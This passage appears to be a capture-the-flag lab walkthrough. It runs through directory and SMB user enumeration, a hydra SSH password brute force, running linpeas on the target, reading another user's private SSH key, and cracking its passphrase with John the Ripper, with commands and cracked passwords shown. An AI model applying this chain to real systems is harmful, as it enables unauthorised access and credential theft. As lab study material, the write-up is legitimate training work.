5. gobuster dir -u "http://10.10.43.220" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


   results:
   /development          (Status: 301) [Size: 318] [--> http://10.10.43.220/development/]

	open http://10.10.43.220/development/
   results:  2 files  	dev.txt	,j.txt
 
 Content of ‘dev.txt’ file: 
 conversations between -J and -K. From this, we understand that they are using Apache version 2.5.12 on the website.
 
 Content of ‘j.txt’ file: 
  we read that -J’s password is weak. This gives us a lead to proceed.  
  
  
  open http://10.10.151.122/server-status
     results: Forbidden  Apache/2.4.41 (Ubuntu) Server at 10.10.151.122 Port 80
	 
	 
6.enum4linux  (similar    to enum.exe  )
     obtaining information about SMB and Windows systems.

 enum4linux -a <ip> #10.10.151.122

results:
   A very long list. At the end we find  the next lines:
   [+] Enumerating users using SID S-1-22-1 and logon username '', password ''

		S-1-22-1-1000 Unix User\kay (Local User)
		S-1-22-1-1001 Unix User\jan (Local User)
		S-1-22-1-1002 Unix User\ubuntu (Local User)
   We can see from the results that the users -J and -K are actually Jan and Kay. We had learned that Jan’s password is weak. To crack the password, we will use a tool called “hydra.” Hydra is a widely used tool for cracking passwords in network systems.
   
7.  sudo hydra -l   <user name>  -P  <word list file>  ssh<ip>
   sudo hydra -l   jan   -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  ssh://10.10.151.122
 

   results:   [22][ssh] host: 10.10.151.122   login: jan  password: armando

8. login using ssh jan@10.10.141.152   with passward: armando


9. Enumerate the machine to find any vectors for privilege escalation.
   
  a. download linpeas:  
  wget https://github.com/peass-ng/PEASS-ng/releases/download/20251017-d864f4c3/linpeas.sh

  copy from the local to remote with the next command :
     scp ./linpeas.sh jan@10.10.141.152:/dev/shm 
SCP, (Secure Copy Protocol), transfer files between  between two remote systems. It uses SSH for encryption 

  cd  /dev/shm
  chmod +x linpeas.sh
  ./linpeas.sh | tee lilog.txt
  
results:  the output is a very long list
    At the middle we will find the next lines :
   "Possible private SSH keys were found! /home/kay/.ssh/id_rsa"
    so 'kay' has a private key.

 
10. cd /home/kay/.ssh
 cat id_rsa   # output private key 

 With the RSA key, we can directly access Kay’s account through an SSH connection without entering a password.
11. copy the content of Kay’s RSA key to a local file named “a.txt” on our own terminal. 
   
   
 With the RSA key, we can directly access Kay’s account through an SSH connection without entering 
 a password. 
 We save Kay’s RSA key to a file named “a.txt” on our own terminal.
 When we attempt to connect to Kay’s account using the RSA key, 
 we notice that the RSA key is also protected by a passphrase.   
   
 First, we need to crack this passphrase. For this purpose, we can use the 
   “ssh2john” tool from “John the Ripper.” John the Ripper is a commonly used tool for password
   cracking on Unix-based systems. Initially, the RSA key, together with ssh2john, 
   will be transformed into a format that John the Ripper can crack. 
   We save the output to a text file named “decrypted1.txt.” Then, we instruct John the Ripper
   to attempt to crack the passphrase by providing the commonly used “rockyou.txt” wordlist. 

chmod 600 a.txt
ssh2john a.txt > decrypted1.txt
run  John the Ripper to attempt to crack the passphrase by providing the commonly used 
“rockyou.txt” wordlist.
sudo john --wordlist=/usr/share/wordlists/rockyou.txt  decrypted1.txt

result:
  beeswax          (a.txt)     
  
in 'kay' dir= /home/kat/.ssh   
 run:  
     ssh -i /home/kay/.ssh/id_rsa  kay@<host ip>         #10.10.170.185

input the pass 'beeswax'
12. ls
   pass.bak  
   cat pass.bak
 the output is the passward
